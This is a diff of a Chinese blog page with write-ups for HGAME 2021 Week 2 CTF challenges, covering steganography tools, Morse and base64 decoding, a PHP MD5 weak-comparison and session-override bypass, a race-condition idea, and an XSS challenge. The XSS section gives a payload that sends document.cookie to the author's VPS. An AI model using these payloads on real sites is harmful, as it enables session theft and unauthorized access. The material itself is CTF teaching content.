@@ -545,30 +545,30 @@
 </blockquote>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206201322285.png"></p>
 <p>F5 解 <code>Matryoshka.jpg</code></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">$ java Extract Matryoshka.jpg -p <span class="token string">"!LyJJ9bi&amp;M7E72*JyD"</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ java Extract Matryoshka.jpg -p <span class="token string">"!LyJJ9bi&amp;M7E72*JyD"</span>
 Huffman decoding starts
 Permutation starts
 <span class="token number">577536</span> indices shuffled
 Extraction starts
 Length of embedded file: <span class="token number">18</span> bytes
-<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">127</span>, <span class="token number">7</span><span class="token punctuation">)</span> code used</code></pre>
+<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">127</span>, <span class="token number">7</span><span class="token punctuation">)</span> code used<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>得到 <code>e@317S*p1A4bIYIs1M</code></p>
 <p>解压</p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206201353990.png"></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># A7SL9nHRJXLh@$EbE8</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># A7SL9nHRJXLh@$EbE8</span>
 $ steghide.exe extract -sf <span class="token string">"01.jpg"</span> -p <span class="token string">"A7SL9nHRJXLh@<span class="token variable">$EbE8</span>"</span>
-wrote extracted data to <span class="token string">"pwd.txt"</span><span class="token builtin class-name">.</span></code></pre>
+wrote extracted data to <span class="token string">"pwd.txt"</span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><code>u0!FO4JUhl5!L55%$&amp;</code></p>
 <p>02.jpg:<code>z0GFieYAee%gdf0%lF</code></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">$ outguess -k <span class="token string">"z0GFieYAee%gdf0%lF"</span> -r 02.jpg output.txt 
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ outguess -k <span class="token string">"z0GFieYAee%gdf0%lF"</span> -r 02.jpg output.txt 
 Reading 02.jpg<span class="token punctuation">..</span><span class="token punctuation">..</span>
 Extracting usable bits:   <span class="token number">4930</span> bits
 Steg retrieve: seed: <span class="token number">184</span>, len: <span class="token number">18</span>
 $ <span class="token function">cat</span> output.txt 
-@UjXL93044V5zl2ZKI</code></pre>
+@UjXL93044V5zl2ZKI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>有毒，我用新版 <a target="_blank" rel="noopener" href="https://github.com/resurrecting-open-source-projects/outguess">https://github.com/resurrecting-open-source-projects/outguess</a> 这个出来是乱码……</p>
 <p>要用旧版的 <a target="_blank" rel="noopener" href="https://github.com/crorvick/outguess%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E3%80%82">https://github.com/crorvick/outguess，然后编译安装。</a></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>03.jpg: <code>rFQmRoT5lze@4X4^@0</code></p>
 <p>到这里其实就可以扫出来了~</p>
 <p><code>hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</code></p>
@@ -611,9 +611,9 @@ $ <span class="token function">cat</span> output.txt
 <p>其实对比一下也能看出来。</p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207024542264.png"></p>
 <p>手工抄录一下。</p>
-<pre class="language-none"><code class="language-none">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>解密得到</p>
-<pre class="language-none"><code class="language-none">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><code>hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</code></p>
 <h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><blockquote>
 <p>“我们不仅弄错了他的上下，还颠倒了它的左右。”</p>
@@ -622,7 +622,7 @@ $ <span class="token function">cat</span> output.txt
 <p>图片第0层里隐写了二维码</p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207030024958.png"></p>
 <p>扫码得到 </p>
-<pre class="language-none"><code class="language-none">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>base64 解码发现是倒着的 png</p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207030250744.png"></p>
 <p>也就是下面这张图</p>
@@ -634,7 +634,7 @@ $ <span class="token function">cat</span> output.txt
 <p>发现其实就只有6个有用文件。</p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207175711624.png"></p>
 <p><code>config.ini</code> 是用户配置，注意到这里的 testuser 密码 md5 是 0e 开头。</p>
-<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token selector">[global]</span>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token selector">[global]</span>
 <span class="token constant">debug</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span>
 
 <span class="token selector">[admin]</span>
@@ -643,9 +643,9 @@ $ <span class="token function">cat</span> output.txt
 
 <span class="token selector">[testuser]</span>
 <span class="token constant">username</span> <span class="token attr-value"><span class="token punctuation">=</span> testuser</span>
-<span class="token constant">pass_md5</span> <span class="token attr-value"><span class="token punctuation">=</span> 0e114902927253523756713132279690</span></code></pre>
+<span class="token constant">pass_md5</span> <span class="token attr-value"><span class="token punctuation">=</span> 0e114902927253523756713132279690</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>Config.php</code> 读取上面的配置文件，导入所有用户。</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span>
 
     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword type-declaration">array</span> <span class="token variable">$conf</span><span class="token punctuation">;</span>
@@ -669,9 +669,9 @@ $ <span class="token function">cat</span> output.txt
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 
-<span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+<span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>lazy.php</code> 这里把所有 GET / POST 进来的数据都直接赋值了，是漏洞点。</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"SESSION"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"SEVER"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"COOKIE"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"GLOBALS"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
 <span class="token comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span>
@@ -689,9 +689,9 @@ $ <span class="token function">cat</span> output.txt
 <span class="token keyword">function</span> <span class="token function">auto</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">require_once</span> <span class="token variable">$class_name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-<span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'auto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+<span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'auto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>User.php</code> 定义 User 类</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 
 <span class="token keyword">class</span> <span class="token class-name">User</span>
@@ -721,10 +721,10 @@ $ <span class="token function">cat</span> output.txt
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">getUsersList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token keyword">return</span> <span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></span></code></pre>
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到这里 密码比较是 <strong>MD5 弱类型比较</strong>。</p>
 <p><code>index.php</code></p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token keyword">require_once</span> <span class="token string double-quoted-string">"lazy.php"</span><span class="token punctuation">;</span>
@@ -764,10 +764,10 @@ $ <span class="token function">cat</span> output.txt
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>逻辑是用户登录，然后跳转到 <code>flag.php</code></p>
 <p> <code>flag.php</code></p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">require_once</span> <span class="token string single-quoted-string">'lazy.php'</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -804,36 +804,36 @@ $ <span class="token function">cat</span> output.txt
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到首先要有 <code>$_SESSION['username']</code>，其次这里有个表单，但不关键。</p>
 <p>其实只需要在这里传参改掉 <code>$_SESSION['username']</code> 为 <code>admin</code> 就可了。</p>
 <p>于是构造 payload：</p>
-<pre class="language-none"><code class="language-none">POST http://5588b617f8.lazy.r4u.top/
-username=testuser&amp;password=QNKCDZO</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">POST http://5588b617f8.lazy.r4u.top/
+username=testuser&amp;password=QNKCDZO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207174853265.png" alt="MD5弱类型"></p>
 <p>成功获得 <code>$_SESSION['username']</code>，而后直接 GET 传参改掉这个就好了。</p>
 <p>注意它有个 filter，双写绕过就好了，即 <code>_SESSSESSIONION[username]=admin</code>.</p>
 <p>（实际上这里并不需要登录 2333</p>
-<pre class="language-none"><code class="language-none">GET http://5588b617f8.lazy.r4u.top/flag.php?_SESSSESSIONION%5Busername%5D=admin</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">GET http://5588b617f8.lazy.r4u.top/flag.php?_SESSSESSIONION%5Busername%5D=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207175337633.png" alt="双写绕过"></p>
 <p><code>hgame{R4U~!s-4-lazy~doG}</code></p>
 <blockquote>
 <p><em>Extensive Reading</em></p>
 <p><a target="_blank" rel="noopener" href="https://daolgts.github.io/2018/09/05/unset-%E8%AE%B0%E4%B8%80%E9%81%93CTF%E9%A2%98/">unset_记一道CTF题</a>，里面讲了个有点类似的。</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_POST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_COOKIE'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_POST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_COOKIE'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$$__R</span> <span class="token keyword">as</span> <span class="token variable">$__k</span> <span class="token operator">=&gt;</span> <span class="token variable">$__v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$$__k</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$$__k</span> <span class="token operator">==</span> <span class="token variable">$__v</span><span class="token punctuation">)</span> <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$$__k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <h3 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h3><blockquote>
 <p>Liki生日快要到了，她想要一台switch，你能帮帮她么？</p>
 <p><a target="_blank" rel="noopener" href="https://birthday.liki.link/">https://birthday.liki.link</a> </p>
 </blockquote>
 <p><code>shop.js</code> 里有一些接口相关代码</p>
-<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/API/?m=login"</span><span class="token punctuation">,</span>
         <span class="token punctuation">{</span>
             name<span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
@@ -915,7 +915,7 @@ username=testuser&amp;password=QNKCDZO</code></pre>
             <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
         <span class="token punctuation">}</span>
     <span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>简单看了看发现没啥问题，也做了数据的合法性校验，比如大数溢出、float、负数啥的做不到。</p>
 <p>于是考虑是 <strong>（数据库）条件竞争</strong>。也就是<strong>通过大量并发让服务器措手不及</strong>。</p>
 <p>利用多线程并发去执行同一个 buy 操作，以至于服务器处理的线程之间未能同步好所有请求，扣除余额和发放兑换券不能同时完成，从而就能超过52张兑换券了。</p>
@@ -936,7 +936,7 @@ username=testuser&amp;password=QNKCDZO</code></pre>
 <p>例1：金额提现</p>
 <p>例2：先存储文件，再判断是否合法，然后再删除。===&gt; 写入 shell 木马</p>
 <p>伪代码：</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">saveimg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token comment">//得到保存路径filename</span>
@@ -948,7 +948,7 @@ username=testuser&amp;password=QNKCDZO</code></pre>
         pass<span class="token punctuation">;</span>
     <span class="token comment">//...</span>
  <span class="token punctuation">}</span>
-<span class="token delimiter important">?&gt;</span></span></code></pre>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><blockquote>
 <p>d1gg12 新学了HTML，一起来看看他写的在线博客吧！</p>
@@ -957,7 +957,7 @@ username=testuser&amp;password=QNKCDZO</code></pre>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210210014353832.png"></p>
 <p><strong>XSS</strong></p>
 <p><code>script.js</code> 里有 API</p>
-<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/code"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#captcha'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">"Code: md5(code)[:6] == "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>code<span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -992,24 +992,24 @@ username=testuser&amp;password=QNKCDZO</code></pre>
             <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>于是就构造 XSS 请求，可以发现他过滤了一些关键字，比如 script, http, https，而且用 img 的时候返回的字符倒序了。</p>
 <p>那咱就倒过来写吧。</p>
 <p>最开始是用 img 打到 <a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt</a> 上面的，后来有问题总是接收不到。</p>
 <p>类似于这样</p>
-<pre class="language-none"><code class="language-none">&gt;gpj.pW3uo/tp.ssx//'=crs/gmi&lt;img/src='//xss.pt/ou3Wp.jpg</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&gt;gpj.pW3uo/tp.ssx//'=crs/gmi&lt;img/src='//xss.pt/ou3Wp.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>干脆直接打到自己 VPS 上，用 url 算了。</p>
 <p>注意 submit 的时候需要校验 md5，写个脚本爆破一下。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
 
 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     x <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>
     <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token string">'612bbe'</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-        <span class="token keyword">break</span></code></pre>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Payload:</strong></p>
-<pre class="language-none"><code class="language-none">"eikooc.tnemucod+'/倒过来的VPSIP//'=ferh.onitacol.wodniw"=rorreno/'#'=crs/gmi&lt;
-&lt;img/src='#'/onerror="window.location.href='//VPSIP/'+document.cookie"</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">"eikooc.tnemucod+'/倒过来的VPSIP//'=ferh.onitacol.wodniw"=rorreno/'#'=crs/gmi&lt;
+&lt;img/src='#'/onerror="window.location.href='//VPSIP/'+document.cookie"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>VPS 上拿到 cookie </p>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210210012728845.png"></p>
 <p>然后带着这个 cookie 访问 <code>/flag</code>，拿到 flag</p>
@@ -1020,7 +1020,7 @@ username=testuser&amp;password=QNKCDZO</code></pre>
 </blockquote>
 <p>Header Status 字段 SQL 注入。</p>
